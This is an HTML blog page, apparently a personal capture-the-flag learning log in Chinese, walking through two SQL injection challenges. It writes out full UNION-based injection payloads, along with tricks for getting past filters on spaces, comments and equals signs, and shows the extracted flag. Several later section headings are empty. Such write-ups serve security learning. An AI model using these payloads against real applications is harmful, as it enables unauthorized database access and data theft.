@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>CTF成长记录 | 灰太狼</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+    <meta name="description" content="我一定会回来的">
+  
+  
+  
+    <link rel="alternate" href="/atom.xml" title="灰太狼" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/localshare/css/share.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">灰太狼</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        
+          <a class="main-nav-link" href="/."><i class="fa fa-home"></i> 首页</a>
+        
+          <a class="main-nav-link" href="/archives/"><i class="fa fa-archive"></i> 归档</a>
+        
+          <a class="main-nav-link" href="/about/"><i class="fa fa-user"></i> 关于</a>
+        
+          <a class="main-nav-link" href="/atom.xml"><i class="fa fa-rss"></i> 订阅</a>
+        
+      </nav>
+    </div>
+    <div id="search-form">
+      <div id="result-mask" class="hide"></div>
+      <label><input id="search-key" type="text" autocomplete="off" placeholder="搜索"></label>
+      <div id="result-wrap" class="hide">
+        <div id="search-result"></div>
+      </div>
+      <div class="hide">
+        <template id="search-tpl">
+          <div class="item">
+            <a href="/{path}" title="{title}">
+              <div class="title">{title}</div>
+              <div class="time">{date}</div>
+              <div class="tags">{tags}</div>
+            </a>
+          </div>
+        </template>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-CTF成长记录" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      CTF成长记录
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      
+      <span class="article-date">
+  <i class="fa fa-date"></i>
+  <time class="dt-published" datetime="2023-11-17T13:46:32.000Z" itemprop="datePublished">2023年11月17日</time>
+</span>
+      
+      
+        <span class="article-views">
+  <i class="fa fa-views"></i>
+  <i id="busuanzi_container_page_pv">
+      <i id="busuanzi_value_page_pv"></i>
+  </i>
+</span>
+
+      
+      
+<a href="/2023/11/17/CTF%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/#comments" class="article-comment-link">
+  
+    
+    
+    
+    
+    
+  
+  <i class="fa fa-commt"></i>
+  留言
+</a>
+
+
+    </div>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><span id="more"></span>
+
+<h2 id="空格绕过，and绕过，等号绕过"><a href="#空格绕过，and绕过，等号绕过" class="headerlink" title="空格绕过，and绕过，等号绕过"></a>空格绕过，and绕过，等号绕过</h2><p><img src="/2023/11/17/CTF%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/image-20231120145508186.png" alt="image-20231120145508186"></p>
+<p>wllm等于1，回显正常</p>
+<p><img src="/2023/11/17/CTF%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/image-20231120145539922.png" alt="image-20231120145539922"></p>
+<p>2-1没有回回显，说明参数没有进行逻辑运算，尝试字符串注入</p>
+<p><img src="/2023/11/17/CTF%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/image-20231120145631311.png" alt="image-20231120145631311"></p>
+<p>字符型注入，</p>
+<p><img src="/2023/11/17/CTF%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/image-20231120145732455.png" alt="image-20231120145732455"></p>
+<p>–+被过滤，使用–+或者#的替换编码%23</p>
+<p><img src="/2023/11/17/CTF%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/image-20231120145838693.png" alt="image-20231120145838693"></p>
+<p>产看是否额为空格过滤，替换空格&#x2F;**&#x2F;</p>
+<p><img src="/2023/11/17/CTF%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/image-20231120145944286.png" alt="image-20231120145944286"></p>
+<p>查看回显位：</p>
+<p><img src="/2023/11/17/CTF%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/image-20231120150043684.png" alt="image-20231120150043684"></p>
+<p>查询表名：</p>
+<p>开始查询表明的时候发现还有一个符号被过滤，使用like（）代替等号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm=-1&#x27;/**/union/**/select/**/1,version(),group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like(database())%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/17/CTF%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/image-20231120151043758.png" alt="image-20231120151043758"></p>
+<p>发现LTLT_flag，查看列名</p>
+<p><img src="/2023/11/17/CTF%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/image-20231120151431047.png" alt="image-20231120151431047"></p>
+<p>and别过滤了，将table_schema换成表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm=-1&#x27;/**/union/**/select/**/1,version(),group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like(&#x27;LTLT_flag&#x27;)%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/17/CTF%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/image-20231120151549779.png" alt="image-20231120151549779"></p>
+<p>查看flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm=-1&#x27;/**/union/**/select/**/1,version(),group_concat(flag)/**/from/**/LTLT_flag%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/17/CTF%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/image-20231120151653307.png" alt="image-20231120151653307"></p>
+<p>只有一半，使用mid函数，依次输出了20个字符，改变mid函数中后两个参数的值，最终获取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm=-1&#x27;/**/union/**/select/**/1,version(),mid(group_concat(flag),1,20)/**/from/**/LTLT_flag%23</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your Password:NSSCTF&#123;c1ee6d7d-bbf2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your Password:-4bfd-9ed6-163ab81e7</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your Password:f38&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;c1ee6d7d-bbf2-4bfd-9ed6-163ab81e7f38&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="库名查找schema-name"><a href="#库名查找schema-name" class="headerlink" title="库名查找schema_name"></a>库名查找schema_name</h2><p><img src="/2023/11/17/CTF%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/image-20231120153246687.png" alt="image-20231120153246687"></p>
+<p>给出了，就两列，不用order by了，闭合符号给出了，查询数据库名，表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1)))))) union select database(),group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/17/CTF%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/image-20231120153507249.png" alt="image-20231120153507249"></p>
+<p>发现ctf库只有一个users表，进去后没有flag，查询别的库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1)))))) union select database(),schema_name from information_schema.schemata--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/17/CTF%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/image-20231120153906221.png" alt="image-20231120153906221"></p>
+<p>查看ctftraining库中的数据表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1)))))) union select database(),group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctftraining&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/17/CTF%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/image-20231120154102691.png" alt="image-20231120154102691"></p>
+<p>查看flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1)))))) union select database(),group_concat(column_name) from information_schema.columns where table_schema=&#x27;ctftraining&#x27; and table_name=&#x27;flag&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1)))))) union select database(),group_concat(flag) from ctftraining.flag--+</span><br><span class="line">这里使用ctftraining.flag是因为，ctftraining并不是database（）默认的数据库名，所以要使用ctftraining.flag的形式指定flag表</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/17/CTF%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/image-20231120154408849.png" alt="image-20231120154408849"></p>
+<h1 id="RCE注入"><a href="#RCE注入" class="headerlink" title="RCE注入"></a>RCE注入</h1><h1 id="SSRF注入"><a href="#SSRF注入" class="headerlink" title="SSRF注入"></a>SSRF注入</h1><h1 id="反序列化注入"><a href="#反序列化注入" class="headerlink" title="反序列化注入"></a>反序列化注入</h1><h1 id="xml注入"><a href="#xml注入" class="headerlink" title="xml注入"></a>xml注入</h1>
+        
+            <div id="toc-article">
+                
+  <div class="widget-wrap" id="toc-wrap">
+    <h3 class="widget-title"><i class="fa fa-toc"></i> 文章目录</h3>
+    <div class="widget">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87%EF%BC%8Cand%E7%BB%95%E8%BF%87%EF%BC%8C%E7%AD%89%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">空格绕过，and绕过，等号绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%93%E5%90%8D%E6%9F%A5%E6%89%BEschema-name"><span class="toc-text">库名查找schema_name</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE%E6%B3%A8%E5%85%A5"><span class="toc-text">RCE注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E6%B3%A8%E5%85%A5"><span class="toc-text">SSRF注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5"><span class="toc-text">反序列化注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xml%E6%B3%A8%E5%85%A5"><span class="toc-text">xml注入</span></a></li></ol>
+    </div>
+  </div>
+
+
+            </div>
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="http://example.com/2023/11/17/CTF成长记录/">http://example.com/2023/11/17/CTF成长记录/</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div class="article-tag-wrap">
+          
+
+          
+          
+    <div class="social-share">
+      <span>分享到:</span>
+    </div>
+
+
+
+        </div>
+      
+      
+        
+<nav id="article-nav">
+  
+    <a href="/2023/11/17/XXE/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">older</strong>
+      <div class="article-nav-title">
+        
+          XXE
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+      
+      
+        
+
+
+
+
+
+
+
+
+      
+    </footer>
+  </div>
+</article>
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-posts"></i> 最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/11/17/CTF%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/">CTF成长记录</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/17/XXE/">XXE</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/16/Hacker-Kid/">Hacker Kid</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/14/Lab-6/">反序列化、XXE、暴力破解、逻辑漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">Billu渗透测试</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+    
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-archive"></i> 归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023年</a><span class="archive-list-count">6</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title"><i class="fa fa-link"></i> 友情链接</h3>
+    <div class="widget">
+      <ul>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://www.example1.com/">site-name1</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://www.example2.com/">site-name2</a>
+        </li>
+      
+        <li>
+          <a target="_blank" rel="noopener" href="http://www.example3.com/">site-name3</a>
+        </li>
+      
+      </ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+        
+      </div>
+      <a id="totop" href="#top"></a>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      <p>
+        <a href="/sitemap.xml">网站地图</a>
+        <span> | </span><a href="/atom.xml">订阅本站</a>
+        <span> | </span><a href="/about/">联系博主</a>
+      </p>
+      
+        <p>
+          <i class="fa fa-visitors"></i>
+          <i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>
+          ，
+          <i class="fa fa-views"></i>
+          <i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>
+        </p>
+      
+      <p>
+        <span>Copyright &copy; 2023 bigbigwolf.</span>
+        <span>Theme by <a href="https://github.com/chaooo/hexo-theme-BlueLake/" target="_blank">BlueLake.</a></span>
+        <span>Powered by <a href="https://hexo.io/" target="_blank">Hexo.</a></span>
+      </p>
+    </div>
+  </div>
+</footer>
+
+    </div>
+  </div>
+  
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+<script src="/js/search.json.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+  
+<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+    
+<script src="/localshare/js/social-share.js"></script>
+
+    
+<script src="/localshare/js/qrcode.js"></script>
+
+  
+  
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+
+
+
+
+</body>
+</html>
